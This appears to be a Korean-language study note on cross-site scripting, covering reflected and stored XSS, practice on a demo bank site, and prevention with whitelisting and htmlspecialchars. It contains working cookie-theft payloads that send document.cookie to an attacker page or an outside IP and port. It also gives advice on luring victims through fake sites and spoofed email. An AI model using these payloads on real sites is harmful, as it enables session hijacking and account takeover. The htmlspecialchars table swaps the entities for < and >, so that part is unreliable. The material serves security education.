[XSS]

1. XSS : Cross Site Scripting, 크로스 사이트 스크립팅
    접속한 사용자를 공격하는 웹 해킹 기법으로서,
    사이트안에 게시물 또는 댓글에 해커가 작성한 스크립트를 삽입시켜서 사용자의 권한, 계정을 가로챌 수 있다.

1. 비지속적 XSS : Reflected(Non-persistent) XSS
    인풋 안의 사용자 입력값이 태그 기호 <> 등을를 거르지 않고, 웹 화면에 바로 출력되는 형태의 취약점을 이용한다.
    관련 취약점을 검색하는 방식은 점검자가 입력부분(검색창 등)에 스크립트를 삽입해서 취약점을 찾을 수 있다.
    XSS 취약점이 있는지 확인하기 위해 스크립트로 먼저 팝업 띄우기(alert)부터 시도한다.
    만약 취약점이 발견되면 해커가 동작시키고자하는 스크립트를 삽입시킨다.
    <script>alert("Reflected XSS test")</script>

1.  비지속적 XSS 모의 해킹해보기
    모의 해킹할 사이트에 접속 : http://demo.testfire.net/bank/main.aspx
    다음 스크립트를 우상단 검색창에 삽입 : <script>alert("Reflected XSS test")</script>
    Go 버튼을 클릭 : 팝업이 실행되면 Reflected XSS 취약점이 존재하는 것을 확인할 수 있다.

1. 지속적 XSS : Stored(Persistent , Second Orde) XSS
    Stored XSS는 사용자의 입력데이터가 DB에 저장되고, DB에서 해당 값을 읽어오는 경우 발생되는 취약점이다.
    이 글을 본 사용자는 저 스크립트가 실행되어 쿠키, 세션 탈취가 가능하게 된다.
    이를 사용하기 위해서는 사용자로 하여금 해커의 DB에 연결되는 특정 url에 들어오게 한 뒤, 그곳의 소스 코드에 지속적으로 노출시켜서 정보를 빼낸다.
    사용자의 컴퓨터가 접속되어 있는 한 지속적으로 노출되고 있어서 그 시간동안 더 많은 정보를 빼낼 수 있고, 따라서 비지속적 XSS보다 더 강력하다.

1. 지속적 XSS 모의 해킹해보기
    해킹 준비 : 해커는 자신의 로컬호스트의 cookie.php에 다음과 같은 해킹 코드를 입력해둔다.
    <?php
        $cookie = $_GET['cookie']
        $session = $_POST['session']
    ?>
    <script>
        console.log(<?php echo $cookie;?>)
        console.log(<?php echo $session;?>)    
    </script>

    첫번째 방법 : 만일 게시판에 스크립트를 삽입할 수 있다면, 다음과 같은 코드를 입력해서 정보를 탈취할 수 있다.
    <script>document.location="localhost:80/cookie.php?cookie="+document.cookie</script>
    * 물론 실제 해킹을 할 때는 로컬호스트가 아닌 해커의 특정 서버 IP를 지정해야한다.
    이러면 해커의 "localhost:80/cookie.php" 화면의 콘솔로그로 상대의 쿠키, 세션 탈취 정보를 취득할 수 있다.
    (물론 해커가 상대의 쿠키, 세션값을 저장시켜놓을 서버를 미리 세팅한 뒤 구동시켜둘 필요가 있다.)

    두번째 방법 : 특정인에게 아래 url을 전달한다. 또는 들어오도록 유도하게 한다. 
    유도하는 방법은 위장 사이트, 성인 사이트 등으로 유도하는 방법도 있고, 이메일등으로 주소를 속여셔 보내는 방법도 있는데,
    아래와 같은 URL을 보낸다.
    http://demo.testfire.net/search.jsp?query=%3Cscript%3Elocation.href=%22http://www.google.com%22;%3C/script%3E 
    도메인의 앞부분만 읽고 demo 사이트구나 생각하고 들어가지만 그 뒤에 실제 다른 곳으로 이동시킨다. 
    이번 url처럼, google이 아닌, 해커의 특정 url이라면, 당신은 끔찍한 일을 당할 수 있다.
    이런 해당 취약점을 이용하여 악의적인 사이트로 연결될 수 있다.
    그 해당 url안에 다음의 코드를 입력해서 cookie.php가 실행되도록 한다.
    <script>document.location="localhost:80/cookie.php?cookie="+document.cookie</script>
    * 물론 실제 해킹을 할 때는 로컬호스트가 아닌 해커의 특정 서버 IP를 지정해야한다.
    위 스크립트가 포함된 화면을 보게되면 사용자의 쿠키, 세션 탈취가 가능하게 된다.

    여태까지 <script> 태그만 사용했는데 해당 태그뿐 아니라,
        <iframe src="javascript:alert('xss')"></iframe>
        <img src="javascript:alert(" XSS")">
        <embed src="http://123.63.2.5:4444/cookie.asp?data='+document.cookie" AllowScriptAccess="always"></embed>
    위 처럼 여러 태그를 이용해서 XSS를 시도할 수 있다.

    위 결과는 단순히 쿠키 전달 과정을 이해하라고 넣은 것이다.
    안전을 위해 쿠키 탈취 연습은 demo.testfire.net 사이트에서 하는 것을 추천한다.

1. 예방법
    예전에는 블랙리스트 방식(막을 태그들을 일일이 등록)을 썼었지만 이는 너무 번거로운 일이다.
    현재는 화이트리스트 방식(등록된 태그를 제외한 모든 태그는 허용하지 않는 방식)을 사용하고 있다.
    또한 보안을 위해서 PHP라는 웹프로그래밍언어에서는 html코드로 인식할 수 없게 처리하기 위해서,
    htmlspecialchars 같은 함수를 사용하기도 한다.
        htmlspecialchars은 다음의 왼쪽 기호 등을 우측 문자 형태로 치환하는 함수이다. (html상에서는 우측 문자도 표시형태가 똑같다.)
        # > -> &lt;
        # < -> &gt;
        # & -> &amp;
        # " -> &quot;
        # ' -> &#039;
